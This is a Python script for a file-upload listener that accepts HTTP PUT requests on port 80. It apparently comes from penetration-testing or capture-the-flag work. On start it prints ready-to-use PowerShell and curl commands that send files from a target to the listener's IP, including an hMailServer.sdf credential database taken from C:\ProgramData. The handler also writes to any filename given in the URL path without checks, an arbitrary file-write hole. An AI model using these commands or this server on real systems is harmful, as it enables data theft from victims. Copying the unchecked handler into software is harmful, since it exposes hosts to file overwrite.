#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class PutHandler(BaseHTTPRequestHandler):
    def do_PUT(self):
        content_length = int(self.headers['Content-Length'])
        data = self.rfile.read(content_length)
        
        # Extract filename from path (remove leading slash)
        filename = urllib.parse.unquote(self.path[1:])
        if not filename:
            filename = "uploaded_file"
            
        with open(filename, 'wb') as f:
            f.write(data)
            
        self.send_response(200)
        self.end_headers()
        print(f"Received file: {filename} ({content_length} bytes)")
        
    def log_message(self, format, *args):
        # Optional: Clean up console output
        print(f"{self.address_string()} - {format % args}")


if __name__ == '__main__':
    print("=" * 60)
    print("UPLOAD SERVER - PUT method enabled on port 80")
    print("=" * 60)
    print("\nExample usage commands:")
    print("-" * 40)
    print('PowerShell:')
    print('  powershell -c "Invoke-WebRequest -Uri http://10.10.15.169/hMailServer.sdf -Method PUT -InFile \'C:\\ProgramData\\hMailServer.sdf\'"')
    print('\ncurl (Linux/Mac):')
    print('  curl -X PUT -T "hMailServer.sdf" http://192.168.1.100/hMailServer.sdf')
    print('\nPowerShell (alternative):')
    print('  Invoke-WebRequest -Uri "http://10.10.14.226/C8D69EBE9A43E9DEBF6B5FBD48B521B9" -Method Put -InFile "C8D69EBE9A43E9DEBF6B5FBD48B521B9"')
    print('\ncurl (Windows):')
    print('  curl.exe -X PUT -T "C8D69EBE9A43E9DEBF6B5FBD48B521B9" http://10.10.14.226/C8D69EBE9A43E9DEBF6B5FBD48B521B9')
    print("-" * 40)
    print("\nStarting server on 0.0.0.0:80...")
    print("Waiting for uploads...\n")
    
    server = HTTPServer(('0.0.0.0', 80), PutHandler)
    server.serve_forever()
